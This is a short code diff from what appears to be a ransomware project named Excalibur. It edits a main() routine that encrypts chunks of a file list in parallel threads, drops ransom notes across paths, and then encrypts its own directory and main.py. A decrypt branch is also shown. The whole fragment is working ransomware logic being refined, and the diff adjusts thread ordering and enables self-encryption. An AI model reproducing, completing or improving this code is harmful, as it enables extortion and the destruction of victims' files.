@@ -47,8 +47,8 @@ def main():
         threads = []
         for chunk in list(create_chunks(file_array, chunk_size)):  # Loop through each chunk in array
             t = ThreadedEncrypt(sanctuary, chunk)  # Create a new thread for each chunk
-            t.start()
             threads.append(t)
+            t.start()
 
         # Wait until all threads have joined, then drop notes and encrypt self
         for t in threads:
@@ -56,13 +56,11 @@ def main():
 
         leave_notes(note, paths)
 
-        # Encrypt everything in Excalibur directory
-        for rootdir, subdir, files in os.walk("."):
+        # Encrypt the Excalibur directory
+        for root, subdir, files in os.walk(".", topdown=False):
             for file in files:
-                sanctuary.encrypt_file(os.path.abspath(file))
-
-        # sanctuary.encrypt_file(os.path.abspath(__file__)) # Encrypt main.py
-        # sanctuary.encrypt_file(os.path.abspath(sys.argv[0]))
+                sanctuary.encrypt_file(file)
+        sanctuary.encrypt_file(os.path.abspath(__file__))  # Encrypt main.py
 
     # Decryption is not threaded purely for debugging purposes
     elif user_input in ["d", "D", "dec", "decrypt", "Decrypt"]:
